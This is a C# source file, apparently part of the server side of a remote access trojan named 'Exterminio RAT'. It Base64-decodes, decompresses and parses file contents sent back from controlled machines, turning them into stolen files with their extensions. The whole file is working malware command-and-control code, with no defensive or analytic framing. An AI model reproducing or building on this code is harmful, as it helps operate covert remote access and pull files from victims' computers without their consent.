using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace Exterminio_RAT_Servidor
{
    public class DownloadResult
    {
        public string Estado { get; set; } // "completado", "fallido"
        public string Mensaje { get; set; }
        public string RutaArchivo { get; set; }
        public string Extension { get; set; }
        public byte[] DatosArchivo { get; set; }
    }

    public static class DownloadResponseProcessor
    {
        public static string ProcesarRespuestaDescarga(string datosBase64)
        {
            try
            {
                Console.WriteLine($"📥 Procesando respuesta de descarga: {datosBase64.Length} caracteres");
                
                // Decodificar Base64
                byte[] datosComprimidos = Convert.FromBase64String(datosBase64);
                Console.WriteLine($"📊 Datos decodificados de Base64: {datosComprimidos.Length} bytes");
                
                // Descomprimir con Deflate
                using (MemoryStream compressedStream = new MemoryStream(datosComprimidos))
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    deflateStream.CopyTo(decompressedStream);
                    byte[] datosDescomprimidos = decompressedStream.ToArray();
                    string resultado = Encoding.UTF8.GetString(datosDescomprimidos);
                    
                    Console.WriteLine($"📊 Datos descomprimidos: {datosDescomprimidos.Length} bytes");
                    Console.WriteLine($"📋 Resultado: {resultado.Substring(0, Math.Min(100, resultado.Length))}...");
                    
                    return resultado;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de descarga: {ex.Message}");
                return $"ERROR: {ex.Message}";
            }
        }

        public static DownloadResult ParsearRespuestaDescarga(string informacion)
        {
            try
            {
                Console.WriteLine($"📋 Parseando información de descarga: {informacion.Substring(0, Math.Min(100, informacion.Length))}...");
                
                // Buscar la primera línea que contiene la extensión
                string[] lineas = informacion.Split('\n');
                if (lineas.Length == 0)
                {
                    return new DownloadResult
                    {
                        Estado = "fallido",
                        Mensaje = "No se encontró información de extensión"
                    };
                }
                
                string primeraLinea = lineas[0].Trim();
                Console.WriteLine($"📋 Primera línea: {primeraLinea}");
                
                // Verificar si la primera línea contiene la extensión (formato: "EXTENSION:base64...")
                if (!primeraLinea.Contains(":"))
                {
                    return new DownloadResult
                    {
                        Estado = "fallido",
                        Mensaje = "Formato inválido: no se encontró separador ':'"
                    };
                }
                
                // Separar extensión y datos Base64
                int indiceSeparador = primeraLinea.IndexOf(':');
                string extension = primeraLinea.Substring(0, indiceSeparador).Trim();
                string base64Datos = primeraLinea.Substring(indiceSeparador + 1).Trim();
                
                Console.WriteLine($"📋 Extensión detectada: {extension}");
                Console.WriteLine($"📊 Tamaño Base64: {base64Datos.Length} caracteres");
                
                // Verificar que la extensión sea válida
                if (string.IsNullOrEmpty(extension) || extension.Length > 10)
                {
                    return new DownloadResult
                    {
                        Estado = "fallido",
                        Mensaje = "Extensión inválida o muy larga"
                    };
                }
                
                // Decodificar los datos Base64 del archivo
                byte[] datosArchivo;
                try
                {
                    datosArchivo = Convert.FromBase64String(base64Datos);
                    Console.WriteLine($"📊 Datos del archivo decodificados: {datosArchivo.Length} bytes");
                }
                catch (Exception ex)
                {
                    return new DownloadResult
                    {
                        Estado = "fallido",
                        Mensaje = $"Error decodificando Base64: {ex.Message}"
                    };
                }
                
                return new DownloadResult
                {
                    Estado = "completado",
                    Mensaje = $"Archivo descargado exitosamente: {extension} ({datosArchivo.Length} bytes)",
                    Extension = extension,
                    DatosArchivo = datosArchivo
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error parseando respuesta de descarga: {ex.Message}");
                return new DownloadResult
                {
                    Estado = "fallido",
                    Mensaje = $"Error parseando respuesta: {ex.Message}"
                };
            }
        }
    }
}
